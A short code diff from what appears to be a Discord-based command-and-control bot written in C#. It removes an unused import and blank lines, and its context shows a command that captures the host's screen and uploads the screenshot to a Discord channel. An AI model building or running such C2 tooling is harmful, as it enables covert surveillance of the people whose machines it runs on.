@@ -1,13 +1,11 @@
 using Discord;
 using Discord.Commands;
 using RunMode = Discord.Commands.RunMode;
-using System.Drawing;
 
 namespace DiscordC2.Modules;
 
 public class DiscordC2Commands : ModuleBase<ShardedCommandContext>
 {
-    
     public CommandService CommandService { get; set; }
 
     // [Command("hello", RunMode = RunMode.Async)]
@@ -35,3 +33,4 @@ public class DiscordC2Commands : ModuleBase<ShardedCommandContext>
         await Context.Message.Channel.SendFileAsync(Utils.GetScreenshot(), "screenshot.png");
     }
 }
+
